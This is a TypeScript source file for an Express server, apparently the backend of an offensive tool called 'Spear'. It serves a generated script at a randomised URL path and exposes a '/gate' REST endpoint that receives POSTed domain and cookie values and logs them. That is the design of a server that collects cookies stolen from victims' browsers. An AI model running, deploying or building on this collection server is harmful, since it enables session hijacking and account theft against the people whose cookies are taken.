import * as http from "http";
import * as express from "express"
import * as bodyParser from "body-parser";
import * as cors from "cors";
import * as fs from "fs";
import {Generator} from "./modules/generator";
import {Logger} from "./modules/logger";
import {Loader} from "./modules/loader";
const app = express();
export class App {
  public conf:any;
  private logger:Logger;
  public generator:Generator;
  public loader:Loader;
  public eccipient: any;
  public detectedIp: any;
  public salty: String;
    constructor() {
        this.logger = new Logger();
        this.generator = new Generator();
        this.loader = new Loader();
        this.loader.bannerMessage();
        this.detectedIp = this.loader.findIp();
        app.use(cors())
        app.use(bodyParser.urlencoded({
            extended: false
        }));
         app.use(bodyParser.json());
        if (process.argv[2] === '-c' && process.argv[3] === 'config.json'){
            fs.readFile('./'+process.argv[3], "utf8", (err, jsonString) => {
              if (err) throw err;
                this.conf = JSON.parse(jsonString);
                if (!this.conf.randomName){
                  this.salty="Spear";
                } else {
                  this.salty= this.loader.randomString();
                }
                this.generator.populate(JSON.parse(jsonString),this.salty);
                this.eccipient = this.generator.init();
                this.generator.endpoint();
                this.start(this.conf.port,this.detectedIp);
            });
          } else {
          this.logger.jsonError();
        }
    }
  private start(x:any,y:any): void {
        app.get('/'+this.salty,(req,res)=>{
          res.send(this.eccipient);
        });
        app.post('/gate',(req,res)=>{
          if (req.body.domain === null && req.body.cookie === null){
            this.logger.alertMessage(req);
          } else {
            this.logger.writeLogs(req.body);
          }
            res.status(200);
            res.end();
         });
        const web = http.createServer(app);
        web.listen(x,y , () => {
          console.log('[!] '+this.loader.colorStr(this.loader.color.Yellow,'Server Status ON with '+`PID: ${process.pid}`));
          console.log('[!] '+this.loader.colorStr(this.loader.color.Yellow,'Rest-API on: '+this.detectedIp+':'+this.conf.port+'/gate'));
        });
    }
}
export default new App();
